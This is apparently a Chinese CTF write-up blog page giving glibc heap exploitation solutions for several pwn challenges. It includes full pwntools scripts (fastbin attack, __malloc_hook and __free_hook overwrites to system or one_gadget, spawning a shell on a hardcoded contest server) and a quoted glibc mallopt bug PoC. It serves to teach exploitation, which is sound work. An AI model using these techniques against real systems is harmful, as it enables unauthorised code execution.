class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">0x3d</span><br><br>	og = libc_base + <span class="hljs-number">0x45226</span><br>	<span class="hljs-comment">#og = libc_base + 0x4527a</span><br>	<span class="hljs-comment">#og = libc_base + 0xf0364</span><br>	og = libc_base + <span class="hljs-number">0xf1207</span><br>	<span class="hljs-comment">#0x000000000007218c : mov rdi, rbx ; call qword ptr [rax + 0x18]</span><br>	<span class="hljs-comment">#0x000000000012c8d1 : mov rdi, r10 ; call qword ptr [rax + 0x20]</span><br>	recall = libc_base + <span class="hljs-number">0x7218c</span><br><br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>	ad(<span class="hljs-number">0x88</span>)<br>	target_chunk = heap - <span class="hljs-number">0xc0</span> + <span class="hljs-number">8</span><br>	li(<span class="hljs-string">&#x27;target_chunk: &#x27;</span> + <span class="hljs-built_in">hex</span>(target_chunk))<br>	p = p64(target_chunk) <span class="hljs-comment"># set rax value</span><br>	p += p64(recall) <span class="hljs-comment"># rax + 0x10</span><br>	p += p64(og)     <span class="hljs-comment"># rax + 0x18</span><br>	se(p)<br><br>	db()<br>	size()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>







<h2 id="PWN4-引流之主"><a href="#PWN4-引流之主" class="headerlink" title="PWN4[引流之主]"></a>PWN4[引流之主]</h2><p>采用glob函数打开一个目录，采用*类似与通配符，遍历文件，由于涉及到堆的开辟与释放，开辟内存大的话，存在unsorted bin管理，堆中存在main_arena附近地址，通过uaf漏洞泄漏libc，然后采用fastbin attack修改<code>__malloc_hook</code>为one_gadget即可</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># Env: Linux arch 5.8.14-arch1-1</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;112.126.71.170&quot;</span><br>server_port = <span class="hljs-number">45123</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>():<br>	sleep(<span class="hljs-number">0.3</span>)<br>	sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">i</span>):<br>	sleep(<span class="hljs-number">0.3</span>)<br>	sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	sl(<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">i, d</span>):<br>	sleep(<span class="hljs-number">0.3</span>)<br>	sl(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	sl(<span class="hljs-built_in">str</span>(i))<br>	s(d)<br>		<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">i</span>):<br>	sleep(<span class="hljs-number">0.3</span>)<br>	sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br>	sl(<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">glob</span>(<span class="hljs-params">d</span>):<br>	sleep(<span class="hljs-number">0.3</span>)<br>	sl(<span class="hljs-string">&#x27;5&#x27;</span>)<br>	sl(d)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	glob(<span class="hljs-string">&#x27;/proc/self/*\n&#x27;</span>)<br>	ad() <span class="hljs-comment"># 0</span><br>	dp(<span class="hljs-number">0</span>)<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>	libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x10</span> - <span class="hljs-number">0x58</span><br>	malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>	one_gadget = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	one_gadget = libc_base + <span class="hljs-number">0xf1207</span><br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	ad() <span class="hljs-comment"># 1</span><br><br>	rm(<span class="hljs-number">0</span>)<br>	md(<span class="hljs-number">0</span>, p64(malloc_hook - <span class="hljs-number">0x23</span>))<br>	ad() <span class="hljs-comment"># 2</span><br>	ad() <span class="hljs-comment"># 3</span><br>	p = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x13</span> - <span class="hljs-number">0x8</span>)<br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(one_gadget)<br>	md(<span class="hljs-number">3</span>, p)<br>	<span class="hljs-comment">#db()</span><br><br>	ad()<span class="hljs-comment"># 4</span><br>	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>



<h2 id="PWN5-把嘴闭上"><a href="#PWN5-把嘴闭上" class="headerlink" title="PWN5 [把嘴闭上]"></a>PWN5 [把嘴闭上]</h2><p>这个是个glibc的一个历年漏洞，采用mallopt函数能够修改top chunk指针。</p>
<p>触发poc如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c">https:<span class="hljs-comment">//sourceware.org/bugzilla/show_bug.cgi?id=25733</span><br><br>            Bug ID: <span class="hljs-number">25733</span><br>           Summary: mallopt(M_MXFAST) can <span class="hljs-built_in">set</span> global_max_fast to <span class="hljs-number">0</span><br>           Product: glibc<br>           Version: <span class="hljs-number">2.31</span><br>            Status: UNCONFIRMED<br>          Severity: normal<br>          Priority: P2<br>         Component: <span class="hljs-built_in">malloc</span><br>          Assignee: unassigned at sourceware dot org<br>          Reporter: maxkamper at outlook dot com<br>  Target Milestone: ---<br><br>mallopt(M_MXFAST) can <span class="hljs-built_in">set</span> global_max_fast to <span class="hljs-number">0.</span><br><br>This doesn<span class="hljs-number">&#x27;</span>t seem intentional because <span class="hljs-title function_">mallopt</span><span class="hljs-params">(M_MXFAST, <span class="hljs-number">0</span>)</span> sets global_max_fast<br>to SMALLBIN_WIDTH.<br><br>Passing a value between 1-7 to <span class="hljs-title function_">mallopt</span><span class="hljs-params">(M_MXFAST, value)</span> sets global_max_fast to<br>0.<br><br>Both <span class="hljs-built_in">malloc</span>.c and the mallopt man page document the legitimate range of values<br>that may be passed to <span class="hljs-title function_">mallopt</span><span class="hljs-params">(M_MXFAST, value)</span> as &quot;0 to 80*<span class="hljs-title function_">sizeof</span><span class="hljs-params">(<span class="hljs-type">size_t</span>)</span>/4&quot;.<br><br>In GLIBC versions &gt;= <span class="hljs-number">2.27</span> this has the same effect as setting global_max_fast<br>to SMALLBIN_WIDTH, but it is perhaps of some concern in GLIBC versions &lt;= <span class="hljs-number">2.26</span><br>because of how global_max_fast is treated as an indicator of main arena<br>initialization by malloc_consolidate().<br><br>If the following example is compiled &amp; run under GLIBC version <span class="hljs-number">2.26</span>, a chunk is<br>allocated overlapping the main arena:<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> main(<span class="hljs-type">void</span>) &#123;<br><br>    <span class="hljs-comment">// Populate last_remainder, which is treated as the top chunk size field</span><br>    <span class="hljs-comment">// after main arena re-initialization.</span><br>    <span class="hljs-type">void</span>* remainder_me = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>); <span class="hljs-comment">// Avoid top chunk consolidation.</span><br>    <span class="hljs-built_in">free</span>(remainder_me);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>); <span class="hljs-comment">// Remainder remainder_me chunk.</span><br><br>    <span class="hljs-comment">// Set global_max_fast to 0.</span><br>    mallopt(M_MXFAST, <span class="hljs-number">7</span>);<br><br>    <span class="hljs-comment">// Trigger malloc_consolidate(), which could happen during large</span><br>    <span class="hljs-comment">// allocations/frees, but for the sake of simplicity here just call</span><br>    <span class="hljs-comment">// mallopt() again.</span><br>    mallopt(M_MXFAST, <span class="hljs-number">0x78</span>);<br><br>    <span class="hljs-comment">// malloc_consolidate() uses global_max_fast to determine if malloc has</span><br>    <span class="hljs-comment">// been initialized. If global_max_fast is 0, malloc_consolidate() will</span><br>    <span class="hljs-comment">// re-initialize the main arena, setting its top chunk pointer to an address</span><br>    <span class="hljs-comment">// within the main arena. Now last_remainder acts as the top chunk size</span><br>    <span class="hljs-comment">// field.</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>-- <br>You are receiving this mail because:<br>You are on the CC <span class="hljs-built_in">list</span> <span class="hljs-keyword">for</span> the bug.<br></code></pre></td></tr></table></figure>

<p>但是，上面这个poc只是将top chunk 往下移动了，若我们在两次mallopt之间加入一个malloc(0x1f)的话，能够将top chunk指针修改为main_arena + 88处，这样在下次开辟的时候就能开辟到main_arena+ 88处了，虽然能够修改main_arena + 88 以上的内存，但是不能修改top chunk指针指向我们的目标地址，我想的是修改<code>_IO_2_1_stdout_</code>伪造虚表劫持，中途开辟的时候容易修改main_arena中的东西，导致开辟内存失败，出错。然后后面放弃了，比赛结束就没做了。。。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>听说<code>__free_hook</code>就在这附近，直接开辟到<code>__free_hook</code>劫持即可，也有修改<code>_IO_list_all</code>伪造IO_FILE劫持的。</p>
<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>不断开辟到<code>__free_hook</code>，劫持<code>__free_hook</code>为system。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># Env: Linux arch 5.8.14-arch1-1</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;./libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;112.126.71.170&quot;</span><br>server_port = <span class="hljs-number">23548</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">1</span><br>LIBC  = <span class="hljs-number">1</span><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-comment"># 1 ~ 1f</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">sz, d</span>):<br>	sla(<span class="hljs-string">&#x27; &gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27; &gt; &#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br>	sa(<span class="hljs-string">&#x27; &gt; &#x27;</span>, d)<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>():<br>	sla(<span class="hljs-string">&#x27; &gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch</span>(<span class="hljs-params">p, sz</span>):<br>	sla(<span class="hljs-string">&#x27; &gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27; &gt; &#x27;</span>, <span class="hljs-built_in">str</span>(p))<br>	sl(<span class="hljs-built_in">str</span>(sz))<br><br><span class="hljs-comment"># 401 ~ 4ff</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad2</span>(<span class="hljs-params">sz, d</span>):<br>	sla(<span class="hljs-string">&#x27; &gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27; &gt; &#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br>	s(d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27; &gt; &#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	libc_puts = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>	li(<span class="hljs-string">&#x27;libc_puts: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_puts))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x4f8</span>))<br>	s(<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x4f8</span>)<br>	ad(<span class="hljs-number">0x18</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x18</span>)<br>	rm()<br>	<span class="hljs-comment"># set global_max_fast to 0</span><br>	ch(<span class="hljs-number">1</span>, <span class="hljs-number">7</span>)<br>	ad(<span class="hljs-number">0x1</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x1</span>)<br>	<span class="hljs-comment">#ad2(0x408, &#x27;A&#x27; * 0x18)</span><br>	ch(<span class="hljs-number">1</span>, <span class="hljs-number">0x78</span>)<br><br>	libc_base = libc_puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>	libc_system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>	main_arena = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] + <span class="hljs-number">0x10</span><br><br>	ad2(<span class="hljs-number">0x4f8</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	ad2(<span class="hljs-number">0x4f8</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	ad2(<span class="hljs-number">0x4f8</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	ad2(<span class="hljs-number">0x4f8</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	ad2(<span class="hljs-number">0x4f8</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	<br>	p = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>	p = p.ljust(<span class="hljs-number">0x320</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>	p += p64(libc_system)<br>	ad2(<span class="hljs-number">0x4f8</span>, p)<br>	db()<br>	rm()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>



<h2 id="PWN6-garden"><a href="#PWN6-garden" class="headerlink" title="PWN6[garden]"></a>PWN6[garden]</h2><p>该glibc是2.29的，程序开辟限定了大小，也之存在一次uaf漏洞利用，和fastbin的开辟，结合tcache bin机制和unsorted bin分割通过uaf构造堆重叠，打印函数打印出unsorted bin的残留信息泄漏出libc，通过堆重叠修该tcache fd指向<code>__free_hook</code>，指针数组已经满了，重新释放掉再开辟即可开辟到<code>__free_hook</code>处，修改为system，free传入’&#x2F;bin&#x2F;sh’即可。</p>
